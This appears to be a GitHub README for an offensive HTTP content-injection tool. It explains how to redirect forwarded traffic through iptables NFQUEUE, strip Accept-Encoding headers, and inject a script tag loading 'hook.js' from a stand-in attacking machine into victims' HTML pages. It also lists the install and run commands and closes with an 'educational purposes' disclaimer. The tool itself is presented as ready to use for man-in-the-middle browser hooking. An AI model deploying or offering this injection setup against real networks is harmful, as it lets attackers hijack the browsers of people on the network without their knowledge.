# HTTP Content Injection

This repository contains a Python script for performing HTTP Content Injection using the netfilterqueue and scapy libraries. The attack intercepts HTTP traffic, modifies requests and responses to inject custom JavaScript code.

## Prerequisites

Before running the script, ensure you have the required libraries installed. You can install them using the following commands:

pip install netfilterqueue
pip install scapy

Usage
Setting up iptables: Before running the script, make sure to set up iptables to redirect the packets to the netfilterqueue. Execute the following commands:

iptables -I FORWARD -j NFQUEUE --queue-num 0
Running the script: To use the HTTP Content Injection script, execute it with the following command:

python http_content_injection.py

Functionality
The script intercepts packets using the netfilterqueue and scapy. It identifies HTTP requests and responses on port 80 and performs content injection based on specific patterns.

For HTTP requests (port 80): It removes the "Accept-Encoding" header from the request to prevent compression.

For HTTP responses (port 80): It injects custom JavaScript code into the response HTML by adding the following line just before the </body> tag:

<script src="http://your_attacking_machine:3000/hook.js"></script>
It also adjusts the "Content-Length" header to accommodate the injected code properly.

Warning
HTTP Content Injection is a powerful attack technique and can lead to legal consequences if used without explicit permission on unauthorized networks or websites. This script is provided for educational purposes only and should be used responsibly and with caution.

Disclaimer
The creator of this repository is not responsible for any misuse or damage caused by the use of this script. Use it responsibly and ensure compliance with applicable laws and regulations.

Happy and ethical hacking!
